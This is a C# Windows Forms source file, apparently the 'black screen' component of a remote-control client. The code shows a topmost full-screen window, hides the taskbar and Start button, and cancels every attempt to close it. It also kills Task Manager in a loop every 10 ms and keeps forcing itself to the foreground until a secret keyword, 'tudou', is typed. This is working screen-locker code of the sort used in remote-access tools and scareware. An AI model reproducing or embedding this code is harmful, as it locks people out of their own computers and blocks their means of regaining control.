using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using RemoteControl.Client.BlackScreen;

namespace RemoteControl.Client.Excutor
{
    public partial class FrmBlackScreen : Form
    {
        private string magic = string.Empty;

        public FrmBlackScreen()
        {
            InitializeComponent();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            BlackScreen();

            new Thread(() => StartBlockTaskManager()) { IsBackground = true }.Start();
            new Thread(() => StartKeepForeground()) { IsBackground = true }.Start();
        }

        private void FrmMain_KeyUp(object sender, KeyEventArgs e)
        {
            try
            {
                magic += (char)e.KeyCode;
                if (magic.ToLower().Contains("tudou"))
                {
                    UnBlackScreen();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void BlackScreen()
        {
            Win32Api.SetWindowPos(this.Handle, -1, 0, 0, 0, 0, 1 | 2);
            Win32Api.ShowWindow(Win32Api.FindWindow("Shell_TrayWnd", null), Win32Api.SW_HIDE);
            Win32Api.ShowWindow(Win32Api.FindWindow("Button", null), Win32Api.SW_HIDE);
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Maximized;
        }

        private void UnBlackScreen()
        {
            Win32Api.ShowWindow(Win32Api.FindWindow("Shell_TrayWnd", null), Win32Api.SW_SHOW);
            Win32Api.ShowWindow(Win32Api.FindWindow("Button", null), Win32Api.SW_SHOW);
            Environment.Exit(0);
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            /*屏蔽alt+f4以及任何通过发送WM_CLOSE消息的方式*/
            e.Cancel = true;
        }

        private void StartBlockTaskManager()
        {
            while (true)
            {
                var pros = Process.GetProcesses();
                for (int i = 0; i < pros.Length; i++)
                {
                    Process p = pros[i];
                    if (p.ProcessName.ToLower().Contains("taskmgr"))
                    {
                        try
                        {
                            p.Kill();
                        }
                        catch 
                        {
                        }
                    }
                }
                Thread.Sleep(10);
            }
        }

        private void StartKeepForeground()
        {
            for (; ; )
            {
                try
                {
                    Win32Api.SetForegroundWindow(this.Handle);
                }
                catch
                {
                }
                Thread.Sleep(10);
            }
        }
    }
}
